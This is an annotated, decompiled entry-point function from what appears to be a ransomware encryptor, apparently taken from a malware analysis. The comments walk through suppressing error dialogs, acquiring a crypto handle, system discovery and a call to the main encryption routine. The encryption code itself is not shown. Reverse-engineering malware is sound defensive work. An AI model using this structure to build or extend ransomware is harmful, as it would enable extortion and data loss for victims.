void __noreturn start()
{
  DWORD CurrentProcessId; // eax

  // Change the error reporting mode to:
  // - The system does not display the Windows Error Reporting dialog.
  // - The system does not display the critical-error-handler message box.
  SetErrorMode('\x03');
  // Attaches the calling process to the console of the parent process
  if ( !AttachConsole(0xFFFFFFFF) )
  {
    AllocConsole();                             // Create a new console object
    CurrentProcessId = GetCurrentProcessId();   // Get the current process ID
    AttachConsole(CurrentProcessId);            // Attach the new console to the current process ID
  }
  AquireNewCryptoAPIHandle();                   // # Step 1 Aquire a new cryptographic handler
  SystemInformationDiscovery();                 // # Step 2 Get System information and prep CSPRNG
  ProcessEncryption(0);                         // # Step 3 Start main encryptor functionality
  Sleep(20000u);                                // # Step 4 Sleep for 20 seconds
  ExitProcess(0);                               // # Step 5 Terminate encryptor as successful
}